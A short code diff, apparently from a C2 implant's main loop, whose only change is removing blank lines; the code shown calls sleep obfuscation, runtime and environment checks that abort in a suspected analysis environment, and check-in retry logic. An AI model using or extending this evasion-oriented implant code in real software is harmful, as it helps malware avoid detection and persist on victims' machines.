@@ -11,14 +11,12 @@ namespace Implant {
         do {
             Opsec::SleepObf();
             Opsec::SeRuntimeCheck();
-
             if (!Opsec::CheckTime()) {
                 continue;
             }
 
             if (!Ctx->Session.Checkin && !Ctx->Transport.OutboundQueue) {
                 Opsec::SeCheckEnvironment();
-
                 if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                     return_defer(ntstatus);
                 }
@@ -28,7 +26,6 @@ namespace Implant {
 
             if (ntstatus != ERROR_SUCCESS) {
                 Ctx->Session.Retry++;
-
                 if (Ctx->Session.Retry == 3) {
                     break;
                 }
